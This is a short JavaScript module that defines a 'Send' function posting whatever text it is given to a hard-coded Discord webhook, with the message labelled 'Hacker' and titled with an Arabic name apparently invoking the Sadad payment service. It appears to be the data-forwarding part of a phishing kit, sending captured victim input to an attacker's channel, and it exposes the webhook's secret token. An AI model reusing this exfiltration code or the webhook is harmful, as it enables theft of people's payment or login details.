import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1365733429538197684/8rfdu4mryh-YYxu-nRdrNhXg15ay76Ct4Py1CuZZ7f2tl7HBjUUbjR9FpzBXU2gjG1w5",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
